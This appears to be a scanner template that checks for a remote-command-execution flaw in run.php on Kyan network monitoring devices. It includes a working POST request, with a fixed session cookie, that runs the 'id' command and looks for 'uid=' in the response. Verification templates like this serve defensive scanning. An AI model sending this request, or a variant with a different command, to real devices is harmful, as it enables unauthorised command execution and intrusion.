app: Kyan
query: title:"platform - Login"
meta:
  name: Kyan 网络监控设备 run.php 远程命令执行漏洞
  level: 4
  tags:
    - remote_code_execution
  description: Kyan 网络监控监控设备存在远程命令执行漏洞，在登录后的run.php下可执行任意命令。
  homepage: ""
  author: Administrator
  references: https://www.freebuf.com/articles/web/277708.html
  solution: ""
  steps:
    verify_steps:
      type: or
      verify:
        - request:
            method: POST
            path: /run.php
            redirect: false
            header:
              - Content-Type: application/x-www-form-urlencoded
              - Cookie: PHPSESSID=pgdjcne7ohf0dbp8t1trtv2o03; MemoryTree=1|1; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%204%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D
            params: command=id
          response:
            - name: code
              value: "200"
              type: equals
            - name: body
              value: uid=
              type: contains
  create_at: "2022-05-23 14:57:42"
